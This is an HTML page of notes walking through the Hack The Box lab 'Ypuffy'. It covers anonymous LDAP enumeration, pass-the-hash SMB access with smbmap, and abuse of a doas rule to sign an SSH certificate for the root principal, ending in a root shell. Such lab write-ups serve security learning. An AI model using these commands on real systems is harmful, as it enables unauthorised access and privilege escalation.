@@ -1,0 +1,58 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Ypuffy - LDAP Pass the Hash SMB SSHAUTH DoAs Sign Xorg</title>
+</head><body>Can see in enum version port 80, OpenBSD httpd. OpenSSH 7.7 to fingerprint OpenBSD version<br/>
+LDAP anonymous bind<br/>
+<br/>
+Finding the Base DN for LDAP using ldap-rootdse.nse and ldap-search.nse nmap script<br/>
+By default, we analyze that ldap search scope is the 'wholeSubtree' and not the 'base'. This is why nmap is able to get information by default, but ldapsearch needs it to be specified. Additionally, once connected with 'base', objects need to be filtered in order to return results. This can be done with namingcontexts.<br/>
+ldapsearch -x -h &lt;HOST&gt; -s base namingcontexts<br/>
+<br/>
+Finally, just update the base dn and you can use ldapsearch<br/>
+ldapsearch -x -h &lt;HOST&gt; -b 'dc=hackthebox,dn=htb'&#09;&#09;if you feel like specifying, you can '-s sub' for wholeSubtree<br/>
+<br/>
+We find a password/hash and username<br/>
+Can paste the NTLM hash twice if you don't want to type or find the blank LM hash for formatting<br/>
+<br/>
+# smbmap -u alice1978 -p 'hash:hash' -H &lt;HOST&gt; -R&#09;&#09;-R will recurse list shares<br/>
+<br/>
+PuTTY ssh key<br/>
+Can import into PuTTY or work with it by installing: apt install putty-tools<br/>
+# puttygen *.ppk -O private-openssh -o ssh.pem<br/>
+<br/>
+user.txt access as alice<br/>
+On to root!<br/>
+<br/>
+doas is a BSD alternative to sudo. Check /etc/doas.conf for a list of what can be run<br/>
+permit keepenv :wheel<br/>
+permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen<br/>
+<br/>
+Go back to the webserver and check /etc/httpd.conf to see what's there<br/>
+&nbsp;/userca<br/>
+&nbsp;/sshauth<br/>
+&nbsp;&#09;fastcgi socket "/run/wsgi/sshauthd.socket"<br/>
+<br/>
+ps aux, we can see /usr/local/bin/uwsgi --daemonize /var/log/sshauthd --uid appsrv --ini /var/appsrv, so some configs/logs to check out<br/>
+<br/>
+in /etc/ssh/sshd_config<br/>
+AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%u<br/>
+AuthorizedKeysCommandUser nobody<br/>
+TrustedUserCAKeys /home/userca/ca.pub<br/>
+AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%u<br/>
+AuthorizedPrincipalsCommandUser nobody<br/>
+<br/>
+type=keys gives the public key for a user<br/>
+type=principals, loop through all users (getent passwd), and we see root:3m3rgencyB4ckd00r<br/>
+<br/>
+We are allowed to create keys as userca via doas and sign it with the CA so it will be valid when it's checked for auth. -n is the principal name it will be tied to<br/>
+$ doas -u userca ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I PleaseSubscribe root<br/>
+Signed user key root-cert.pub: id "PleaseSubscribe" serial 0 for 3m3rgencyB4ckd00r valid forever<br/>
+<br/>
+$ ssh -i root root@localhost<br/>
+# whoami<br/>
+root<br/>
+<br/>
+<br/>
+</body></html>
